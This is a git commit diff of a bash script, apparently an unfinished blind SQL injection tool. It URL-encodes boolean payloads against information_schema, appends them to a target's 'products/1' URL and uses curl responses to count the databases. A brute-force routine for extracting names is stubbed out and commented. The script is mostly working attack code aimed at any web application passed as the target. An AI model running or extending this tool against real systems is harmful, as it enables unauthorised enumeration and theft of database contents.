da8d87064f7e4ea8209986f8f1d4fb789dcce638
omerAlBa <45664296+omerAlBa@users.noreply.github.com>
2024-02-13 22:37:55 +0100

    amount is now working

--- blindSqlNew.sh
+++ blindSqlNew.sh
@@ -11,6 +11,8 @@
 
 # use the length to guess the name of the table
 
+MYSQL_STANDARD_DATABASES=('mysql','information_schema')
+
 function getLength() {
 	echo 'i get you the length'
 	# store the length in array!
@@ -21,52 +23,73 @@ function getLength() {
 }
 
 function encodeToUrl() {
-	echo 'i will encode it to url'
 	# it can make some problems! NOT SURE!
 	# PROBLEMES can come from the quots
 	#echo $(python -c `from urllib.parse import quote; print(quote(\"${1}\"));`)
-	
+
 	# will that solve our Problem?
-	echo $(echo "$1" | jq -Rr '@uri')
+	echo $(echo "$1" | /usr/bin/jq -Rr '@uri')
 }
 
 function getAmount() {
 	echo 'i get the amount of the tables/columns/content'
-	# required: 
+	# required:
 	# - database
 	# - sqli
 	# parameter: ??
+
+	sqlQuery=$1
+
 	tableName='information_schema.tables'
 	condition="table_schema = ${database}"
-	sqli=(SELECT COUNT(*) FROM ${tableName} WHERE ${condition}) > 0
-	
+	#sqli=(SELECT COUNT(*) FROM ${tableName} WHERE ${condition}) > 0
+
+	for index in {1..6}; do
+		sqli="AND (${sqlQuery}) > $index"
+		echo "$sqli"
+		request "$sqli"
+		echo $?
+	done
 }
 
 function bruteForceName() {
-	echo 'i will get the name'
-	# required: 
+	echo "i will get the name"
+	# required:
 	# - length
 	# - count
 	# - database/table/columns
 	# sqli
 
-	encodeUrl=$(encodeToUrl "${PATH} ${sqli}")
 
-	for index in $(seq 1 $length); do
-		for letter in {a..z} do
-			rquest $encodedUrl
-		done
-	done
+	#for index in $(seq 1 $length); do
+	#	for letter in {a..z} do
+	#		echo ''
+	#		#request $encodedUrl
+	#	done
+	#done
 }
 
 function request() {
-	echo 'i will take care of the request and also the validation of the response'
+	#echo 'i will take care of the request and also the validation of the response'
 	# rquired
 	# - parsed url
+	# take care of parsing url!
+	encodedUrl=$(encodeToUrl "$1")
+	echo "$encodedUrl"
+	echo "$URL/${PATH}%20${encodedUrl}"
+	/usr/bin/curl --silent -i "$URL/${PATH}%20${encodedUrl}" | /usr/bin/head -n 1 | /usr/bin/grep -q '200'
+	#/usr/bin/curl --silent -i $URL/"${PATH}%20${encodedUrl}" | /usr/bin/head -n 1
 }
 
-SQLiTablesCount="SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=${database}"
-SQLiColumnsCount="SELECT COUNT(*) FROM ${table}"
-SQLILength="SELECT LENGTH(<column>) FROM information_schema.<column> WHERE <table_schema> = <table_name>"
+#SQLiTablesCount="SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=${database}"
+#SQLiColumnsCount="SELECT COUNT(*) FROM ${table}"
+#SQLILength="SELECT LENGTH(<column>) FROM information_schema.<column> WHERE <table_schema> = <table_name>"
 
+URL="http://${target}"
 PATH="products/1"
+
+# find all datbases that are not standad only the number!
+# which are in mysql standard?
+# mysql, information_schema
+
+getAmount 'SELECT COUNT(*) FROM information_schema.schemata'
